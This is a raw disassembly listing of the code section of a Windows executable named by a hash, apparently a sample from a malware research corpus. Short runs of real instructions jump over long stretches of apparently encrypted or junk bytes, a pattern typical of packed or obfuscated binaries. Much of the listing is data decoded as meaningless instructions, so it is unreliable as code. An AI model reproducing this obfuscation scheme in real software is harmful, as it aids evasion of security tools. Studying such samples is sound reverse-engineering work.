
a5786ff9d5a63fdfeb95ed7ab94f7d403f614dd8e96f6e00f4829a271d98f2ad.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	push   ebp
  402001:	mov    ebp,esp
  402003:	jmp    0x4020db
  402008:	adc    DWORD PTR [edx],ecx
  40200a:	mov    WORD PTR [ebp-0x71e66861],ss
  402010:	jne    0x40201d
  402012:	inc    bl
  402014:	push   ebp
  402015:	test   al,0x3a
  402017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402018:	add    BYTE PTR [eax],al
  40201a:	add    BYTE PTR [eax],al
  40201c:	mov    ebx,0x59000000
  402021:	push   edx
  402022:	pop    ebx
  402023:	inc    ebp
  402024:	pop    ebp
  402025:	dec    ecx
  402026:	pop    edi
  402027:	push   ebx
  402028:	or     DWORD PTR [ebp+ecx*1+0xc],ebp
  40202c:	xor    al,0x3a
  40202e:	adc    DWORD PTR [eax],edx
  402030:	adc    DWORD PTR [eax],edi
  402032:	test   eax,0x2e1685a2
  402037:	syscall 
  402039:	pop    ds
  40203a:	(bad)  
  40203b:	push   es
  40203c:	adc    DWORD PTR ds:0x463021b3,ebx
  402042:	repnz sub bl,0xfc
  402046:	sbb    esi,DWORD PTR [ecx]
  402048:	add    edi,DWORD PTR [ebx]
  40204a:	test   ah,0x3
  40204d:	(bad)  
  40204e:	enter  0x523f,0x83
  402052:	or     al,0xa2
  402054:	adc    BYTE PTR [edi],0x3
  402057:	fs xchg ecx,eax
  402059:	cmp    eax,0xeb91c0b1
  40205e:	push   edi
  40205f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402060:	out    dx,eax
  402061:	dec    ebp
  402062:	jae    0x402081
  402064:	iret   
  402065:	lock stos BYTE PTR es:[edi],al
  402067:	jnp    0x40207a
  402069:	mov    eax,ds:0x80749a6a
  40206e:	dec    esp
  40206f:	pop    esi
  402070:	cs jb  0x4020bf
  402073:	femms  
  402075:	mov    ebp,0x692557d3
  40207a:	int3   
  40207b:	or     DWORD PTR [ebp+0x38fa4f2d],0xffffffae
  402082:	pop    ds
  402083:	jge    0x4020e8
  402085:	pop    ds
  402086:	push   ds
  402087:	mov    ebx,0x5d9d6679
  40208c:	shl    DWORD PTR [ecx+0x63e5e585],cl
  402092:	stc    
  402093:	inc    esp
  402094:	cmp    al,0x3
  402096:	fbld   TBYTE PTR ds:0x5e2b590f
  40209c:	push   ecx
  40209d:	or     ebx,DWORD PTR [ebx-0x58]
  4020a0:	push   eax
  4020a1:	jbe    0x40206d
  4020a3:	ss ins BYTE PTR es:[edi],dx
  4020a5:	sub    DWORD PTR [eax-0x68aee1db],eax
  4020ab:	mov    edi,0x14a00b47
  4020b0:	and    DWORD PTR [ebx+0x50589166],ebp
  4020b6:	ds push 0x8
  4020b9:	pop    es
  4020ba:	shr    edx,0x8a
  4020bd:	or     ecx,DWORD PTR [edx+0x2b044162]
  4020c3:	or     eax,0x18de5eeb
  4020c8:	inc    esi
  4020c9:	cmc    
  4020ca:	out    dx,eax
  4020cb:	mov    ebp,DWORD PTR ss:[edi]
  4020ce:	in     al,0x86
  4020d0:	jbe    0x4020c3
  4020d2:	push   0xd5f2aa74
  4020d7:	adc    al,0x40
  4020d9:	jle    0x402088
  4020db:	sub    esp,0x60
  4020de:	mov    eax,DWORD PTR [ebp-0x40]
  4020e1:	adc    DWORD PTR ds:0x4335a8,ecx
  4020e7:	mov    ecx,DWORD PTR [ebp-0x3c]
  4020ea:	cmp    DWORD PTR ds:0x433610,0x0
  4020f1:	jge    0x4021e2
  4020f7:	jmp    0x4021e2
  4020fc:	push   DWORD PTR [ebp-0x18]
  4020ff:	push   0x3de1
  402104:	call   DWORD PTR ds:0x43c7c0
  40210a:	jmp    0x4021e2
  40210f:	xchg   DWORD PTR [eax],esp
  402111:	xor    BYTE PTR [edx+0x3587b2b7],dh
  402117:	and    DWORD PTR [edx+0x21],ebx
  40211a:	jo     0x402118
  40211c:	mov    ch,0xd
  40211e:	xchg   ebp,eax
  40211f:	mov    ebx,0xbb000000
  402124:	add    BYTE PTR [eax],al
  402126:	add    cl,ah
  402128:	inc    ebx
  402129:	cmp    al,0x8b
  40212b:	dec    ebx
  40212c:	sbb    al,0x61
  40212e:	adc    edi,DWORD PTR [ebp+0x75]
  402131:	mov    eax,0x4c10020e
  402136:	push   0xffffffaa
  402138:	dec    edx
  402139:	imul   edx,DWORD PTR [ebx+0x5d],0x4d
  40213d:	out    dx,eax
  40213e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40213f:	or     esi,DWORD PTR [ebx-0x28]
  402142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402143:	(bad)  
  402144:	mov    dl,0x74
  402146:	mov    ecx,0x979a0bef
  40214b:	xchg   esi,eax
  40214c:	cmp    al,0x25
  40214e:	dec    edx
  40214f:	cs inc edi
  402152:	lods   al,BYTE PTR ds:[esi]
  402153:	xchg   esp,eax
  402154:	pop    ds
  402155:	cmc    
  402156:	das    
  402157:	inc    eax
  402158:	pop    ss
  402159:	and    al,0xc2
  40215b:	mov    ch,0x10
  40215d:	bound  ebp,QWORD PTR [ebx-0x18ba8973]
  402163:	inc    ebx
  402164:	xchg   DWORD PTR [ebx],esi
  402166:	les    ebx,FWORD PTR [ebx+0x15]
  402169:	or     eax,DWORD PTR [ebx+0x48]
  40216c:	and    BYTE PTR [eax-0x6c],ch
  40216f:	mov    ds:0x7a29a07f,al
  402174:	retf   
  402175:	shl    ebx,0x3f
  402178:	out    0x18,al
  40217a:	pop    ecx
  40217b:	pop    ss
  40217c:	mov    esp,0x893266d5
  402181:	push   cs
  402182:	dec    ebp
  402183:	dec    edi
  402184:	jns    0x8699e5f2
  40218a:	xchg   edi,eax
  40218b:	cmp    BYTE PTR [ebx+0x33],0xd2
  40218f:	out    0x6,al
  402191:	add    esi,DWORD PTR ds:0x1419b70e
  402197:	into   
  402198:	mov    al,0x7c
  40219a:	add    eax,0x1edd8783
  40219f:	loope  0x402155
  4021a1:	ja     0x402136
  4021a3:	fldcw  WORD PTR [esi+0x1e]
  4021a6:	push   ecx
  4021a7:	push   esi
  4021a8:	or     ebp,ebp
  4021aa:	mov    dh,0xfe
  4021ac:	jne    0x4021bf
  4021ae:	aaa    
  4021af:	(bad)  
  4021b0:	not    DWORD PTR [eax+0x68a2a03d]
  4021b6:	xchg   esp,eax
  4021b7:	push   esi
  4021b8:	arpl   dx,dx
  4021ba:	das    
  4021bb:	or     DWORD PTR [ebx],0x34
  4021be:	out    0xff,al
  4021c0:	(bad)  
  4021c1:	mov    esp,0xa600ee22
  4021c6:	lods   al,BYTE PTR ds:[esi]
  4021c7:	mov    esi,0x631cc4cb
  4021cc:	mov    cl,0x8a
  4021ce:	inc    eax
  4021cf:	push   ds
  4021d0:	ret    
  4021d1:	mov    bh,0xe4
  4021d3:	shr    BYTE PTR [ebx],1
  4021d5:	retf   0x4682
  4021d8:	mov    cl,0xee
  4021da:	(bad)  [eax+esi*1-0x2555c9db]
  4021e1:	mov    cl,0x8b
  4021e3:	push   ebp
  4021e4:	shr    BYTE PTR [ebx],0xc2
  4021e7:	jmp    0x4022bf
  4021ec:	push   0xffffffc8
  4021ee:	or     ecx,DWORD PTR [ebx+ebp*4-0x31]
  4021f2:	outs   dx,DWORD PTR ds:[esi]
  4021f3:	out    dx,al
  4021f4:	dec    edx
  4021f5:	imul   eax,DWORD PTR [ebx-0x30212af3],0x176a1
  4021ff:	add    BYTE PTR [ebx-0x2c000000],bh
  402205:	xchg   edi,eax
  402206:	push   ds
  402207:	cwde   
  402208:	xchg   esp,eax
  402209:	lods   al,BYTE PTR ds:[esi]
  40220a:	pop    edi
  40220b:	mov    esp,fs
  40220d:	mov    ebx,0xc4455820
  402212:	mov    esi,eax
  402214:	iret   
  402215:	mov    dl,0x25
  402217:	mov    BYTE PTR [eax],dl
  402219:	mov    BYTE PTR [eax],0xb1
  40221c:	stc    
  40221d:	out    0xbb,eax
  40221f:	test   eax,0x30c3b086
  402224:	(bad)  
  402225:	and    DWORD PTR [ecx-0x342a48f4],ebx
  40222b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40222c:	dec    esi
  40222d:	jmp    0x1cb6:0xde3601c1
  402234:	out    dx,eax
  402235:	int    0x6c
  402237:	push   ebp
  402238:	xor    BYTE PTR [ebp+0x6940cd9e],al
  40223e:	rol    BYTE PTR [ecx-0x2a],cl
  402241:	scas   al,BYTE PTR es:[edi]
  402242:	(bad)  
  402243:	cmp    BYTE PTR [edx-0x48],dl
  402246:	or     ebp,esi
  402248:	push   ecx
  402249:	rcr    BYTE PTR [eax+0x33],1
  40224c:	mov    dh,0x33
  40224e:	cmp    al,0xd6
  402250:	rcl    DWORD PTR [edx-0x4d76bc6c],0xb7
  402257:	(bad)  
  402258:	out    0xb3,al
  40225a:	push   ss
  40225b:	add    edx,DWORD PTR [edi+0x42]
  40225e:	or     ebx,ebp
  402260:	cwde   
  402261:	(bad)  [eax+0x7df379b8]
  402267:	jo     0x402288
  402269:	sub    eax,0xd8c42708
  40226e:	shr    DWORD PTR ds:0x84ff17d3,1
  402274:	iret   
  402275:	jg     0x40229f
  402277:	outs   dx,BYTE PTR ds:[esi]
  402278:	sub    dl,dh
  40227a:	dec    ebx
  40227b:	jp     0x402205
  40227d:	(bad)  
  40227f:	adc    ebp,DWORD PTR [edx-0x5e7c68b8]
  402285:	push   0x987dea45
  40228a:	loope  0x402221
  40228c:	mov    cl,0x40
  40228e:	scas   eax,DWORD PTR es:[edi]
  40228f:	sub    DWORD PTR [ecx-0x3d],esp
  402292:	xchg   edx,eax
  402293:	jno    0x4022c0
  402295:	sbb    eax,0x5e0bf1c5
  40229a:	sub    al,BYTE PTR [edi]
  40229c:	mov    ebx,0x7f17731b
  4022a1:	mov    ds:0x7c8948b6,eax
  4022a6:	lods   al,BYTE PTR ds:[esi]
  4022a7:	loop   0x4022b6
  4022a9:	lds    ebp,FWORD PTR ds:0x984e6c1a
  4022af:	cwde   
  4022b0:	inc    esp
  4022b1:	stos   BYTE PTR es:[edi],al
  4022b2:	xchg   ebp,eax
  4022b3:	dec    edx
  4022b4:	mov    ebp,0xdf70758f
  4022b9:	mov    WORD PTR [edi+eiz*1],fs
  4022bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022bd:	cmp    BYTE PTR [ecx+0x53],bl
  4022c0:	push   esi
  4022c1:	jmp    0x402399
  4022c6:	inc    ebx
  4022c7:	aad    0x6d
  4022c9:	pop    ds
  4022ca:	(bad)  
  4022cb:	mov    edi,0x8ee8dd73
  4022d0:	push   esp
  4022d1:	fisubr WORD PTR [ebx]
  4022d3:	sub    eax,0x231deb0
  4022d8:	add    BYTE PTR [eax],al
  4022da:	mov    ebx,0xff000000
  4022df:	repnz push ebx
  4022e1:	clc    
  4022e2:	mov    DWORD PTR ds:[ebp+0x39],ebp
  4022e6:	in     al,dx
  4022e7:	call   0xc212:0x77f8119b
  4022ee:	ins    BYTE PTR es:[edi],dx
  4022ef:	data16 or al,0x95
  4022f2:	sbb    ah,al
  4022f4:	xor    eax,0x2ed50dbc
  4022f9:	jmp    0x8a:0xe3867a4a
  402300:	xlat   BYTE PTR ds:[ebx]
  402301:	push   edi
  402302:	rcl    DWORD PTR [eax],0xd0
  402305:	loop   0x4022c6
  402307:	stc    
  402308:	ret    
  402309:	add    edx,ecx
  40230b:	shl    ebp,1
  40230d:	stos   DWORD PTR es:[edi],eax
  40230e:	leave  
  40230f:	push   esp
  402310:	mov    ecx,0x386e91f
  402315:	pushw  es
  402317:	dec    ecx
  402318:	aas    
  402319:	cmp    al,0x37
  40231b:	cs retf 0x4f15
  40231f:	daa    
  402320:	stc    
  402321:	xchg   ecx,eax
  402322:	jb     0x4022d0
  402324:	repz call DWORD PTR [ecx-0x772ab912]
  40232b:	push   ecx
  40232c:	jge    0x402313
  40232e:	stos   BYTE PTR es:[edi],al
  40232f:	popa   
  402330:	sbb    eax,0x31d6fb6c
  402335:	push   edi
  402336:	neg    dl
  402338:	es add eax,0xc7479a4a
  40233e:	xchg   ecx,eax
  40233f:	mov    eax,ds:0xe18ccd1b
  402344:	test   al,0xe0
  402346:	scas   eax,DWORD PTR es:[edi]
  402347:	arpl   WORD PTR [ecx],bx
  402349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40234a:	xchg   ebx,eax
  40234b:	adc    DWORD PTR [ebx+eiz*1-0x35],ecx
  40234f:	addr16 cdq 
  402351:	fnstenv [edi]
  402353:	xor    eax,0x8ade5d19
  402358:	rol    BYTE PTR [esp+ecx*2+0x42],1
  40235c:	dec    esi
  40235d:	add    BYTE PTR [eax+ecx*2],dl
  402360:	arpl   WORD PTR [esi-0x77839cae],cx
  402366:	pop    esp
  402367:	lahf   
  402368:	repnz pop es
  40236a:	pop    esi
  40236b:	popf   
  40236c:	push   esp
  40236d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40236e:	mov    ebx,0xdc0247a5
  402373:	cmp    al,BYTE PTR [edi+edi*2]
  402376:	pop    eax
  402377:	jae    0x40230a
  402379:	sub    edi,edx
  40237b:	or     al,0x9
  40237d:	and    al,0xe4
  40237f:	les    esp,FWORD PTR [ecx-0x7e]
  402382:	inc    ecx
  402383:	pop    ecx
  402384:	call   0xe0c4:0x3314b678
  40238b:	test   ah,dh
  40238d:	je     0x402358
  40238f:	inc    esi
  402390:	push   es
  402391:	pop    edi
  402392:	push   cs
  402393:	mov    edi,0xfb437d92
  402398:	sbb    DWORD PTR [ebx+0x4589c475],ecx
  40239e:	rcr    BYTE PTR [ebx],0xce
  4023a1:	or     DWORD PTR ds:0x433648,0x43361c
  4023ab:	mov    DWORD PTR [ebp-0x3c],ecx
  4023ae:	sub    ebx,edx
  4023b0:	or     DWORD PTR [ebp-0x40],0xebeb2a60
  4023b7:	or     edx,0x679e
  4023bd:	mov    eax,0xffffdedc
  4023c2:	cmp    DWORD PTR ds:0x433570,0x0
  4023c9:	jbe    0x4024b8
  4023cf:	jmp    0x4024b8
  4023d4:	push   DWORD PTR [ebp-0x18]
  4023d7:	push   DWORD PTR [ebp-0x14]
  4023da:	call   DWORD PTR ds:0x43c7c4
  4023e0:	jmp    0x4024b8
  4023e5:	into   
  4023e6:	mov    ds:0xefefefaf,al
  4023eb:	into   
  4023ec:	mov    ds:0x3f73af7d,eax
  4023f1:	ins    DWORD PTR es:[edi],dx
  4023f2:	sti    
  4023f3:	sbb    cl,BYTE PTR [esi-0x14]
  4023f6:	add    al,BYTE PTR [eax]
  4023f8:	add    BYTE PTR [ebx+0x9000000],bh
  4023fe:	loopne 0x40241f
  402400:	jo     0x402470
  402402:	out    dx,al
  402403:	ret    
  402404:	(bad)  
  402405:	or     eax,DWORD PTR [ebx+edx*8]
  402408:	sbb    eax,0x9c0ca80a
  40240d:	push   cs
  40240e:	addr16 xor eax,0x1a8e22ca
  402414:	lea    esi,[esi+0x680c05b5]
  40241a:	add    eax,esp
  40241c:	(bad)  
  40241d:	cmp    al,0x41
  40241f:	push   ecx
  402420:	cmp    DWORD PTR [ecx],esi
  402422:	(bad)  
  402424:	push   ecx
  402425:	mov    edx,0x3f9aa9ed
  40242a:	push   0x4a
  40242c:	and    ah,dh
  40242e:	mov    si,0x7380
  402432:	mov    WORD PTR [edi],es
  402434:	dec    ebp
  402435:	dec    ecx
  402436:	cmp    ebp,ebp
  402438:	aad    0x87
  40243a:	outs   dx,DWORD PTR ds:[esi]
  40243b:	pusha  
  40243c:	mov    edx,0x4edd9f4d
  402441:	push   esi
  402442:	sar    DWORD PTR [esi+ebx*1],cl
  402445:	add    eax,0xecd5d282
  40244a:	sti    
  40244b:	mov    ah,al
  40244d:	dec    ebx
  40244e:	adc    BYTE PTR [ebp+eiz*2+0xa],ah
  402452:	fstp   DWORD PTR ss:[eax]
  402455:	mov    bl,0xf7
  402457:	retf   
  402458:	xor    BYTE PTR [eax-0x2843964e],bh
  40245e:	or     eax,0x7e4e41ae
  402463:	mov    BYTE PTR [ecx+0x5a],bh
  402466:	jg     0x4024a5
  402468:	mov    ah,0xb6
  40246a:	jmp    0x40240b
  40246c:	cwde   
  40246d:	mov    dh,ah
  40246f:	aas    
  402470:	xor    al,0x1c
  402472:	pop    eax
  402473:	ds sbb eax,0x69a451c2
  402479:	rcr    DWORD PTR [ebx+0x60],1
  40247c:	mov    WORD PTR [eax+eiz*1-0x35],fs
  402480:	and    ebx,esi
  402482:	test   DWORD PTR es:[esi],edx
  402485:	or     eax,ebp
  402487:	ss (bad) 
  402489:	(bad)  
  40248a:	or     DWORD PTR [ecx+0x5c55988e],esp
  402490:	push   es
  402491:	(bad)  
  402492:	int3   
  402493:	jno    0x402511
  402495:	sahf   
  402496:	sti    
  402497:	mov    edx,cr1
  40249a:	fmul   QWORD PTR [esi+0x29027da5]
  4024a0:	sbb    eax,0x33cf31e1
  4024a5:	mov    ebp,0x974e9d26
  4024aa:	test   eax,0x6fca9e90
  4024af:	into   
  4024b0:	or     ebx,esp
  4024b2:	in     al,dx
  4024b3:	lods   al,BYTE PTR ds:[esi]
  4024b4:	into   
  4024b5:	lea    ebp,[edx]
  4024b7:	dec    ebp
  4024b8:	or     DWORD PTR [ebp-0x3c],eax
  4024bb:	mov    ecx,DWORD PTR [ebp-0x48]
  4024be:	mov    edx,DWORD PTR [ebp-0x44]
  4024c1:	mov    esi,DWORD PTR [ebp-0x48]
  4024c4:	mov    ebx,DWORD PTR [ebp-0x44]
  4024c7:	sub    ecx,esi
  4024c9:	mov    DWORD PTR [ebp-0x48],ecx
  4024cc:	movzx  esi,BYTE PTR ds:0x43352c
  4024d3:	sbb    edx,ebx
  4024d5:	jmp    0x4025ad
  4024da:	jecxz  0x402511
  4024dc:	adc    al,0xaf
  4024de:	(bad)  
  4024df:	scas   eax,DWORD PTR es:[edi]
  4024e0:	sti    
  4024e1:	jge    0x402490
  4024e3:	scas   al,BYTE PTR es:[edi]
  4024e4:	cdq    
  4024e5:	int    0x52
  4024e7:	ins    BYTE PTR es:[edi],dx
  4024e8:	mov    al,ds:0x3a74e
  4024ed:	add    BYTE PTR [ebx+0x5000000],bh
  4024f3:	mov    esp,0x89aedd67
  4024f8:	(bad)  [si+0x28]
  4024fc:	push   ds
  4024fd:	das    
  4024fe:	inc    esp
  4024ff:	dec    ebp
  402500:	xor    al,0x6e
  402502:	xchg   esp,eax
  402503:	imul   ebp,DWORD PTR [ebx-0x65],0x4d
  402507:	test   BYTE PTR [edi],0x85
  40250a:	mov    al,ds:0xd9b78a95
  40250f:	mov    esi,0x255a5d8f
  402514:	adc    eax,0xe0aae9fd
  402519:	pop    ecx
  40251a:	jo     0x4024ca
  40251c:	xlat   BYTE PTR ds:[ebx]
  40251d:	inc    ebx
  40251e:	xor    bh,BYTE PTR [ecx]
  402520:	or     BYTE PTR ds:0x2819be3b,dl
  402526:	sar    DWORD PTR ds:0x38d19e5a,cl
  40252c:	xor    DWORD PTR [eax],esp
  40252e:	hlt    
  40252f:	pop    edi
  402530:	mov    edx,0x70cb42de
  402535:	imul   ebx,DWORD PTR [esi],0x74
  402538:	adc    al,0xd4
  40253a:	mov    al,ds:0xe261ed91
  40253f:	cli    
  402540:	mov    ds:0xfc5dbe0,eax
  402545:	es push edi
  402547:	xchg   ch,dh
  402549:	and    BYTE PTR [eax],dl
  40254b:	add    eax,0x7389e74a
  402550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402551:	sti    
  402552:	dec    ebp
  402553:	dec    esi
  402554:	mov    cl,0xcf
  402556:	and    DWORD PTR fs:[esi],edx
  402559:	pop    ecx
  40255a:	sub    al,0xa
  40255c:	inc    ecx
  40255d:	cmp    edx,DWORD PTR [ebx]
  40255f:	imul   ebp,DWORD PTR [ecx-0x64446107],0x99be79d5
  402569:	stc    
  40256a:	(bad)  
  40256b:	and    eax,DWORD PTR ds:0x9f5f436d
  402571:	das    
  402572:	mov    esi,0x4d114d9a
  402577:	dec    ecx
  402578:	xor    bl,BYTE PTR [edi+edx*2]
  40257b:	popa   
  40257c:	inc    eax
  40257d:	out    dx,al
  40257e:	scas   eax,DWORD PTR es:[edi]
  40257f:	scas   al,BYTE PTR es:[edi]
  402580:	push   ss
  402581:	dec    ebp
  402582:	fdiv   st,st(0)
  402584:	sti    
  402585:	push   edx
  402586:	arpl   cx,bp
  402588:	dec    ebp
  402589:	jecxz  0x402521
  40258b:	test   eax,0x89e90c42
  402590:	sub    BYTE PTR [esi+0x13],cl
  402593:	popa   
  402594:	aas    
  402595:	ss ins BYTE PTR es:[edi],dx
  402597:	pop    ss
  402598:	sub    al,0xfd
  40259a:	mov    cs,WORD PTR [bx-0x7b7c]
  40259f:	mov    dh,0xfe
  4025a1:	jb     0x402546
  4025a3:	dec    ebp
  4025a4:	(bad)  
  4025a5:	pop    ebp
  4025a6:	and    al,0x3a
  4025a8:	inc    ah
  4025aa:	fst    QWORD PTR [eax-0x43aa765f]
  4025b0:	jmp    0x402688
  4025b5:	test   al,0x2c
  4025b7:	mov    dh,0x61
  4025b9:	mov    dh,0xfb
  4025bb:	(bad)  
  4025bc:	in     eax,dx
  4025bd:	outs   dx,DWORD PTR ds:[esi]
  4025be:	lea    ebx,[edi-0x61]
  4025c1:	test   DWORD PTR [eax-0x30],ebp
  4025c4:	in     al,0x62
  4025c6:	add    al,0x0
  4025c8:	add    BYTE PTR [ebx-0x5b000000],bh
  4025ce:	sub    DWORD PTR [esi-0x79],esi
  4025d1:	out    0xb4,eax
  4025d3:	retf   0xdf05
  4025d6:	cmp    DWORD PTR [eax+ebp*2],ebx
  4025d9:	push   ecx
  4025da:	ds cdq 
  4025dc:	sti    
  4025dd:	add    dl,BYTE PTR [esi-0x7ce99fff]
  4025e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025e4:	mov    ds:0x8841a647,eax
  4025e9:	mov    ebx,0x4b282d0d
  4025ee:	mov    al,dh
  4025f0:	pop    ds
  4025f1:	mov    ebp,0xe20b663c
  4025f6:	fild   DWORD PTR [esi]
  4025f8:	lahf   
  4025f9:	add    eax,0xf6a45d87
  4025fe:	xor    al,0xb9
  402600:	xor    al,0x9f
  402602:	xchg   edi,eax
  402603:	jecxz  0x4025ac
  402605:	or     BYTE PTR [edi],dh
  402607:	(bad)  
  402608:	lock in eax,dx
  40260a:	add    al,0x69
  40260c:	push   es
  40260d:	pop    ss
  40260e:	cmp    DWORD PTR [eax-0x2e1258a],edi
  402614:	jno    0x402690
  402616:	arpl   WORD PTR [ebx+0x6e],ax
  402619:	fs inc eax
  40261b:	mov    bl,0xda
  40261d:	popa   
  40261e:	xlat   BYTE PTR ds:[ebx]
  40261f:	or     al,0xed
  402621:	adc    bl,BYTE PTR [esi+0x5e58b545]
  402627:	inc    ecx
  402628:	inc    ebp
  402629:	outs   dx,BYTE PTR ds:[esi]
  40262a:	dec    ebp
  40262b:	push   ds
  40262c:	rcl    BYTE PTR [edi-0x2d],1
  40262f:	xchg   BYTE PTR ds:0x4b0c6443,dh
  402635:	mov    esi,0xf1bf5ef6
  40263a:	xchg   ebx,eax
  40263b:	(bad)  
  40263c:	jo     0x402683
  40263e:	scas   al,BYTE PTR es:[edi]
  40263f:	lds    esi,FWORD PTR [ebp-0x5afca6bc]
  402645:	mov    BYTE PTR [ebp+0x9],ah
  402648:	pop    es
  402649:	jno    0x4025f4
  40264b:	test   dl,cl
  40264d:	add    ebx,DWORD PTR [edx+0x7422c6e7]
  402653:	jp     0x40261e
  402655:	bnd jmp 0x402649
  402658:	sbb    al,0xf
  40265a:	cmp    esi,edx
  40265c:	pop    esp
  40265d:	les    esp,FWORD PTR [ebx+0x7e]
  402660:	add    DWORD PTR [ebx-0x46],ecx
  402663:	push   0xb4cda82b
  402668:	mov    esp,0x7f8550ef
  40266d:	mov    esp,0xc7936d63
  402672:	into   
  402673:	outs   dx,BYTE PTR ds:[esi]
  402674:	and    BYTE PTR [edi-0x608cdfc9],ah
  40267a:	imul   ecx,eax,0xffffffe1
  40267d:	or     edx,DWORD PTR [edi-0x191c803]
  402683:	pop    esi
  402684:	jmp    0xb84d:0x81128cb8
  40268b:	sahf   
  40268c:	xor    bl,ch
  40268e:	jmp    0x40261b
  402690:	xor    eax,0x433664
  402695:	sbb    esi,DWORD PTR ds:0x433644
  40269b:	mov    DWORD PTR ds:0x433664,esi
  4026a1:	or     DWORD PTR [ebp-0x44],eax
  4026a4:	mov    eax,ds:0x43302c
  4026a9:	mov    eax,DWORD PTR [eax]
  4026ab:	dec    ebx
  4026ac:	jmp    0x402784
  4026b1:	mov    ecx,0x7d5e31d5
  4026b6:	(bad)  
  4026b7:	push   edi
  4026b9:	dec    eax
  4026ba:	(bad)
  4026be:	rcl    DWORD PTR [edi-0x3d],0x1d
  4026c2:	add    eax,0xbb0000
  4026c7:	add    BYTE PTR [eax],al
  4026c9:	adc    al,0xcb
  4026cb:	jb     0x402692
  4026cd:	data16 xlat BYTE PTR ds:[ebx]
  4026cf:	jp     0x402666
  4026d1:	pop    ss
  4026d2:	xchg   esp,eax
  4026d3:	push   cs
  4026d4:	fwait
  4026d5:	sub    eax,0x9fc53062
  4026da:	nop
  4026db:	push   es
  4026dc:	int    0x9f
  4026de:	push   esp
  4026df:	jmp    0x9189:0xcb5b42fd
  4026e6:	mov    al,0x92
  4026e8:	pop    ebp
  4026e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026ea:	xor    esi,DWORD PTR [ecx+0x53]
  4026ed:	(bad)  [ebx+0x492ce471]
  4026f3:	loopne 0x4026a3
  4026f5:	pop    ebp
  4026f6:	fs icebp 
  4026f8:	mov    dl,0xb6
  4026fa:	jns    0x402763
  4026fc:	and    bh,BYTE PTR [eax]
  4026fe:	jo     0x402691
  402700:	sbb    ecx,esi
  402702:	xchg   ebp,eax
  402703:	add    ebx,DWORD PTR [ebx-0xa2f49ab]
  402709:	rol    BYTE PTR [edi-0x23],1
  40270c:	repz and dl,bh
  40270f:	xor    ebx,eax
  402711:	mov    ebx,0x85da6a95
  402716:	mov    BYTE PTR [bp+si-0x72],dh
  40271a:	out    dx,al
  40271b:	and    al,dh
  40271d:	xchg   BYTE PTR [eax],dl
  40271f:	xchg   ebx,eax
  402720:	or     dl,BYTE PTR [ecx-0x23edf46f]
  402726:	scas   eax,DWORD PTR es:[edi]
  402727:	arpl   WORD PTR [edi-0xf193ba6],si
  40272d:	xchg   ebp,eax
  40272e:	out    0x51,al
  402730:	jmp    0xd3e5b578
  402735:	call   0xa05870a7
  40273a:	clc    
  40273b:	enter  0x246e,0xa0
  40273f:	out    0xb8,al
  402741:	cwde   
  402742:	call   0x495d9516
  402747:	sbb    eax,0x19a0dded
  40274c:	xchg   BYTE PTR [eax-0x4db677b0],al
  402752:	sub    eax,0x1d21ebc9
  402757:	add    BYTE PTR [esi+0x26ace060],ah
  40275d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40275e:	leave  
  40275f:	inc    esi
  402760:	les    ebp,FWORD PTR [ebx]
  402762:	jne    0x40270d
  402764:	xchg   ecx,eax
  402765:	or     eax,DWORD PTR [ecx]
  402767:	mov    edx,0x8aa6f00f
  40276c:	pop    ss
  40276d:	pop    ds
  40276e:	outs   dx,DWORD PTR ds:[esi]
  40276f:	mov    BYTE PTR [eax-0x21],dh
  402772:	or     BYTE PTR [edi-0x71],bh
  402775:	addr16 push esi
  402777:	push   eax
  402778:	inc    ecx
  402779:	adc    DWORD PTR [ebx],esi
  40277b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40277c:	sbb    ecx,edx
  40277e:	popa   
  40277f:	subps  xmm0,XMMWORD PTR [eax+0x2]
  402783:	sbb    ecx,DWORD PTR [ebx+0x103104d]
  402789:	jmp    0x402861
  40278e:	pop    ecx
  40278f:	outs   dx,DWORD PTR ds:[esi]
  402790:	sub    eax,0xfbd63f96
  402795:	out    dx,eax
  402796:	(bad)  
  402798:	xchg   ecx,eax
  402799:	dec    esi
  40279a:	cmp    eax,0xd8703a0a
  40279f:	add    eax,0xbb0000
  4027a4:	add    BYTE PTR [eax],al
  4027a6:	ss (bad) 
  4027a8:	sar    DWORD PTR [ecx+0x4a],1
  4027ab:	xchg   edx,ecx
  4027ad:	stos   BYTE PTR es:[edi],al
  4027ae:	cld    
  4027af:	scas   eax,DWORD PTR es:[edi]
  4027b0:	push   eax
  4027b1:	xor    DWORD PTR ds:0x4158bfc6,esi
  4027b7:	dec    ebx
  4027b8:	into   
  4027b9:	dec    bx
  4027bb:	sub    BYTE PTR [edi],0x95
  4027be:	mov    cl,0xcb
  4027c0:	(bad)  
  4027c1:	xchg   esi,eax
  4027c2:	mov    edi,cs
  4027c4:	xor    eax,0x5268a6bc
  4027c9:	mov    ch,0x44
  4027cb:	aaa    
  4027cc:	or     eax,0xbee99a6f
  4027d1:	xor    eax,0xc2e51762
  4027d6:	mov    cl,0x2b
  4027d8:	mov    ebp,ebp
  4027da:	jp     0x40284c
  4027dc:	adc    BYTE PTR [esi-0x4cf00c25],dl
  4027e2:	stos   BYTE PTR es:[edi],al
  4027e3:	aas    
  4027e4:	and    eax,0x6118e71b
  4027e9:	sbb    BYTE PTR [edx+0xa0a4318],ah
  4027ef:	push   es
  4027f0:	mov    ecx,0xc38db12e
  4027f5:	jmp    0x4027ad
  4027f7:	xchg   esp,eax
  4027f8:	test   eax,edx
  4027fa:	add    eax,0xc751422f
  4027ff:	fsub   DWORD PTR [esi+edx*2-0x47]
  402803:	ret    0x597
  402806:	sub    esp,DWORD PTR [edx-0x7]
  402809:	test   BYTE PTR [edi],al
  40280b:	adc    eax,0xe63937b6
  402810:	icebp  
